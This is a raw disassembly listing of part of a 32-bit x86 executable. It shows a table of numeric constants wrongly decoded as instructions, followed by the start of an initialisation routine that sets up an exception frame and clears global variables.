  4042de:	00 00                	add    %al,(%eax)
  4042e0:	00 00                	add    %al,(%eax)
  4042e2:	00 c8                	add    %cl,%al
  4042e4:	05 40 00 00 00       	add    $0x40,%eax
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	fa                   	cli
  4042ee:	08 40 00             	or     %al,0x0(%eax)
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	00 00                	add    %al,(%eax)
  4042f5:	00 40 9c             	add    %al,-0x64(%eax)
  4042f8:	0c 40                	or     $0x40,%al
  4042fa:	00 00                	add    %al,(%eax)
  4042fc:	00 00                	add    %al,(%eax)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	50                   	push   %eax
  404301:	c3                   	ret
  404302:	0f 40 00             	cmovo  (%eax),%eax
  404305:	00 00                	add    %al,(%eax)
  404307:	00 00                	add    %al,(%eax)
  404309:	00 24 f4             	add    %ah,(%esp,%esi,8)
  40430c:	12 40 00             	adc    0x0(%eax),%al
  40430f:	00 00                	add    %al,(%eax)
  404311:	00 00                	add    %al,(%eax)
  404313:	80 96 98 16 40 00 00 	adcb   $0x0,0x401698(%esi)
  40431a:	00 00                	add    %al,(%eax)
  40431c:	00 20                	add    %ah,(%eax)
  40431e:	bc be 19 40 00       	mov    $0x4019be,%esp
  404323:	00 00                	add    %al,(%eax)
  404325:	00 00                	add    %al,(%eax)
  404327:	28 6b ee             	sub    %ch,-0x12(%ebx)
  40432a:	1c 40                	sbb    $0x40,%al
  40432c:	00 00                	add    %al,(%eax)
  40432e:	00 00                	add    %al,(%eax)
  404330:	00 f9                	add    %bh,%cl
  404332:	02 95 20 40 00 00    	add    0x4020(%ebp),%dl
  404338:	00 00                	add    %al,(%eax)
  40433a:	40                   	inc    %eax
  40433b:	b7 43                	mov    $0x43,%bh
  40433d:	ba 23 40 00 00       	mov    $0x4023,%edx
  404342:	00 00                	add    %al,(%eax)
  404344:	10 a5 d4 e8 26 40    	adc    %ah,0x4026e8d4(%ebp)
  40434a:	00 00                	add    %al,(%eax)
  40434c:	00 00                	add    %al,(%eax)
  40434e:	2a e7                	sub    %bh,%ah
  404350:	84 91 2a 40 00 00    	test   %dl,0x402a(%ecx)
  404356:	00 80 f4 20 e6 b5    	add    %al,-0x4a19df0c(%eax)
  40435c:	2d 40 00 00 00       	sub    $0x40,%eax
  404361:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  404366:	30 40 00             	xor    %al,0x0(%eax)
  404369:	00 00                	add    %al,(%eax)
  40436b:	04 bf                	add    $0xbf,%al
  40436d:	c9                   	leave
  40436e:	1b 8e 34 40 00 00    	sbb    0x4034(%esi),%ecx
  404374:	00 c5                	add    %al,%ch
  404376:	2e bc a2 b1 37 40    	cs mov $0x4037b1a2,%esp
  40437c:	00 00                	add    %al,(%eax)
  40437e:	40                   	inc    %eax
  40437f:	76 3a                	jbe    0x4043bb
  404381:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  404384:	3a 40 00             	cmp    0x0(%eax),%al
  404387:	00 e8                	add    %ch,%al
  404389:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  40438c:	c7                   	(bad)
  40438d:	8a 3e                	mov    (%esi),%bh
  40438f:	40                   	inc    %eax
  404390:	00 00                	add    %al,(%eax)
  404392:	62 ac c5 eb 78 ad 41 	bound  %ebp,0x41ad78eb(%ebp,%eax,8)
  404399:	40                   	inc    %eax
  40439a:	00 80 7a 17 b7 26    	add    %al,0x26b7177a(%eax)
  4043a0:	d7                   	xlat   %ds:(%ebx)
  4043a1:	d8 44 40 00          	fadds  0x0(%eax,%eax,2)
  4043a5:	90                   	nop
  4043a6:	ac                   	lods   %ds:(%esi),%al
  4043a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4043a8:	32 78 86             	xor    -0x7a(%eax),%bh
  4043ab:	87 48 40             	xchg   %ecx,0x40(%eax)
  4043ae:	00 b4 57 0a 3f 16 68 	add    %dh,0x68163f0a(%edi,%edx,2)
  4043b5:	a9 4b 40 00 a1       	test   $0xa100404b,%eax
  4043ba:	ed                   	in     (%dx),%eax
  4043bb:	cc                   	int3
  4043bc:	ce                   	into
  4043bd:	1b c2                	sbb    %edx,%eax
  4043bf:	d3 4e 40             	rorl   %cl,0x40(%esi)
  4043c2:	a0 84 14 40 61       	mov    0x61401484,%al
  4043c7:	51                   	push   %ecx
  4043c8:	59                   	pop    %ecx
  4043c9:	84 52 40             	test   %dl,0x40(%edx)
  4043cc:	c8 a5 19 90          	enter  $0x19a5,$0x90
  4043d0:	b9 a5 6f a5 55       	mov    $0x55a56fa5,%ecx
  4043d5:	40                   	inc    %eax
  4043d6:	3a 0f                	cmp    (%edi),%cl
  4043d8:	20 f4                	and    %dh,%ah
  4043da:	27                   	daa
  4043db:	8f                   	(bad)
  4043dc:	cb                   	lret
  4043dd:	ce                   	into
  4043de:	58                   	pop    %eax
  4043df:	40                   	inc    %eax
  4043e0:	84 09                	test   %cl,(%ecx)
  4043e2:	94                   	xchg   %eax,%esp
  4043e3:	f8                   	clc
  4043e4:	78 39                	js     0x40441f
  4043e6:	3f                   	aas
  4043e7:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  4043ee:	d7 
  4043ef:	07                   	pop    %es
  4043f0:	8f                   	(bad)
  4043f1:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  4043f6:	67 04 cd             	addr16 add $0xcd,%al
  4043f9:	c9                   	leave
  4043fa:	f2 c9                	repnz leave
  4043fc:	62 40 96             	bound  %eax,-0x6a(%eax)
  4043ff:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  404405:	fc                   	cld
  404406:	65 40                	gs inc %eax
  404408:	9e                   	sahf
  404409:	b5 70                	mov    $0x70,%ch
  40440b:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  404411:	40                   	inc    %eax
  404412:	d5 a6                	aad    $0xa6
  404414:	cf                   	iret
  404415:	ff 49 1f             	decl   0x1f(%ecx)
  404418:	78 c2                	js     0x4043dc
  40441a:	d3 40 a3             	roll   %cl,-0x5d(%eax)
  40441d:	14 9b                	adc    $0x9b,%al
  40441f:	c5 16                	lds    (%esi),%edx
  404421:	ab                   	stos   %eax,%es:(%edi)
  404422:	b3 ef                	mov    $0xef,%bl
  404424:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  404429:	80 c9 47             	or     $0x47,%cl
  40442c:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  404431:	17                   	pop    %ss
  404432:	e6 7f                	out    %al,$0x7f
  404434:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  40443a:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  40443e:	8d                   	lea    (bad),%esi
  40443f:	f7 70 e0             	divl   -0x20(%eax)
  404442:	7c 42                	jl     0x404486
  404444:	30 c9                	xor    %cl,%cl
  404446:	3c e3                	cmp    $0xe3,%al
  404448:	ff 96 52 8a e7 42    	call   *0x42e78a52(%esi)
  40444e:	8e de                	mov    %esi,%ds
  404450:	f9                   	stc
  404451:	9d                   	popf
  404452:	fb                   	sti
  404453:	eb 7e                	jmp    0x4044d3
  404455:	aa                   	stos   %al,%es:(%edi)
  404456:	51                   	push   %ecx
  404457:	43                   	inc    %ebx
  404458:	8c 2f                	mov    %gs,(%edi)
  40445a:	6a 5c                	push   $0x5c
  40445c:	19 fc                	sbb    %edi,%esp
  40445e:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  404465:	f2 29 2f             	repnz sub %ebp,(%edi)
  404468:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  40446e:	90                   	nop
  40446f:	db 00                	fildl  (%eax)
  404471:	27                   	daa
  404472:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404473:	9f                   	lahf
  404474:	90                   	nop
  404475:	44                   	inc    %esp
  404476:	17                   	pop    %ss
  404477:	aa                   	stos   %al,%es:(%edi)
  404478:	f8                   	clc
  404479:	ae                   	scas   %es:(%edi),%al
  40447a:	10 e3                	adc    %ah,%bl
  40447c:	c5 c4 fa             	(bad)
  40447f:	44                   	inc    %esp
  404480:	59                   	pop    %ecx
  404481:	9c                   	pushf
  404482:	b0 e9                	mov    $0xe9,%al
  404484:	07                   	pop    %es
  404485:	9c                   	pushf
  404486:	8a f2                	mov    %dl,%dh
  404488:	64 45                	fs inc %ebp
  40448a:	d4 f3                	aam    $0xf3
  40448c:	f7 eb                	imul   %ebx
  40448e:	e1 4a                	loope  0x4044da
  404490:	7a 95                	jp     0x404427
  404492:	cf                   	iret
  404493:	45                   	inc    %ebp
  404494:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  40449a:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  4044a0:	0e                   	push   %cs
  4044a1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4044a2:	ae                   	scas   %es:(%edi),%al
  4044a3:	a0 19 e3 a3 46       	mov    0x46a3e319,%al
  4044a8:	17                   	pop    %ss
  4044a9:	0c 75                	or     $0x75,%al
  4044ab:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  4044b2:	e4 a7 93 
  4044b5:	39 3b                	cmp    %edi,(%ebx)
  4044b7:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  4044bc:	e5 5d                	in     $0x5d,%eax
  4044be:	3d c5 5d 3b 8b       	cmp    $0x8b3b5dc5,%eax
  4044c3:	9e                   	sahf
  4044c4:	92                   	xchg   %eax,%edx
  4044c5:	5a                   	pop    %edx
  4044c6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4044c7:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  4044cd:	8c 37                	mov    %?,(%edi)
  4044cf:	61                   	popa
  4044d0:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  4044d3:	d8 25 5d 89 f9 db    	fsubs  0xdbf9895d
  4044d9:	67 f8                	addr16 clc
  4044db:	f3 27                	repz daa
  4044dd:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  4044e2:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  4044e6:	20 8a 02 52 60 c4    	and    %cl,-0x3b9fadfe(%edx)
  4044ec:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  4044f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4044f2:	62 11                	bound  %edx,(%ecx)
  4044f4:	35 ae ca 7b 55       	xor    $0x557bcaae,%eax
  4044f9:	8b ec                	mov    %esp,%ebp
  4044fb:	53                   	push   %ebx
  4044fc:	56                   	push   %esi
  4044fd:	57                   	push   %edi
  4044fe:	33 c0                	xor    %eax,%eax
  404500:	55                   	push   %ebp
  404501:	68 9a 45 40 00       	push   $0x40459a
  404506:	64 ff 30             	push   %fs:(%eax)
  404509:	64 89 20             	mov    %esp,%fs:(%eax)
  40450c:	a1 d0 c3 40 00       	mov    0x40c3d0,%eax
  404511:	c1 e0 02             	shl    $0x2,%eax
  404514:	a3 d4 c3 40 00       	mov    %eax,0x40c3d4
  404519:	33 c0                	xor    %eax,%eax
  40451b:	a3 20 c0 40 00       	mov    %eax,0x40c020
  404520:	33 c0                	xor    %eax,%eax
  404522:	a3 24 c0 40 00       	mov    %eax,0x40c024
  404527:	33 c0                	xor    %eax,%eax
  404529:	a3 28 c0 40 00       	mov    %eax,0x40c028
  40452e:	e8 79 eb ff ff       	call   0x4030ac
  404533:	33 d2                	xor    %edx,%edx
  404535:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  40453b:	33 c0                	xor    %eax,%eax
  40453d:	a3 2c c0 40 00       	mov    %eax,0x40c02c
